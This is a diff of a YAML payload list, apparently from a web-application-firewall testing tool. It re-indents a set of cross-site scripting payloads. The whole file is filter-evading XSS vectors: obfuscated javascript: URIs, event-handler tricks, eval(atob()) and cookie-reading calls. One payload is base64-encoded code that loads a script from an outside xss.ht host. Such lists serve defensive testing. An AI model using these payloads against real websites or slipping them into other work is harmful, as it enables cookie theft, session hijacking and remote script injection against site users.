@@ -1,38 +1,35 @@
-encoder:
-- URL
 payload:
-- javascript:%ef%bb%bfalert(XSS)
-- <svG/x=">"/oNloaD=confirm()//
-- alert?.(document?.cookie)
-- <object/data=javascript:alert()>
-- <a href=javas%26#99;ript:prompt%26#x28document.domain)>xss
-- '"><video><source onerror=eval(atob(http://some_host)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>'
-- <xssBypass/onpointermove=(confirm)(1)>MoveMouseHere
-- Tarun~<"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;">XXXXX</a>
-- <video src=x onerror="prompt(xss">
-- <iframe src="java sc ript:al ert()"></iframe>
-- '%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx'
-- eval(atob('YWxlcnQoKQ=='))
-- document['cookie']
-- <img src onerror=confirm(1)>
-- '&gt;+src+onerror=confirm&amp;lpar;1&amp;rpar;&lt;'
-- "\"></textarea><ScRiPt>prompt(1)</ScRiPt// \"><iframe/onload=alert(1)// \u201D/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt\u201D\
-  />"
-- "{` <body \\< onscroll =1(_=prompt,_(String.fromCharCode(88,83,83,32,66,121,32,77,111,114,112,104,105,110,101)))>\xB4\
-  }"
-- <svg%0Aonauxclick=0;[1].some(confirm)//
-- (xss"><!--><svg/onload=alert(document.domain)>)
-- '%22onauxclick=alert`xss`+a'
-- <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
-- <iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>
-- <j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x
-- data:text/html,<form action=https://127.0.0.1/xss-cp.php method=post><input type=hidden
-  name=a value="<img/src=//127.0.0.1/yt.jpg onpointerenter=alert`1`>"><input type=submit></form>
-- <j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x
-- <!<script>alert(document.domain)</script>
+  - javascript:%ef%bb%bfalert(XSS)
+  - <svG/x=">"/oNloaD=confirm()//
+  - alert?.(document?.cookie)
+  - <object/data=javascript:alert()>
+  - <a href=javas%26#99;ript:prompt%26#x28document.domain)>xss
+  - '"><video><source onerror=eval(atob(http://some_host)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>'
+  - <xssBypass/onpointermove=(confirm)(1)>MoveMouseHere
+  - Tarun~<"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;">XXXXX</a>
+  - <video src=x onerror="prompt(xss">
+  - <iframe src="java sc ript:al ert()"></iframe>
+  - '%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx'
+  - 'eval(atob("YWxlcnQoKQ=="))'
+  - 'document["cookie"]'
+  - <img src onerror=confirm(1)>
+  - '&gt;+src+onerror=confirm&amp;lpar;1&amp;rpar;&lt;'
+  - "\"></textarea><ScRiPt>prompt(1)</ScRiPt// \"><iframe/onload=alert(1)// \u201D/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt\u201D/>"
+  - "{` <body \\< onscroll =1(_=prompt,_(String.fromCharCode(88,83,83,32,66,121,32,77,111,114,112,104,105,110,101)))>\xB4}"
+  - <svg%0Aonauxclick=0;[1].some(confirm)//
+  - (xss"><!--><svg/onload=alert(document.domain)>)
+  - '%22onauxclick=alert`xss`+a'
+  - <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+  - <iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>
+  - <j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x
+  - data:text/html,<form action=https://127.0.0.1/xss-cp.php method=post><input type=hidden name=a value="<img/src=//127.0.0.1/yt.jpg onpointerenter=alert`1`>"><input type=submit></form>
+  - <j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x
+  - <!<script>alert(document.domain)</script>
+encoder:
+  - URL
 placeholder:
-- URLParam
-- HTMLForm
-- HTMLMultipartForm
-- JSONRequest
+  - URLParam
+  - HTMLForm
+  - HTMLMultipartForm
+  - JSONRequest
 type: XSS
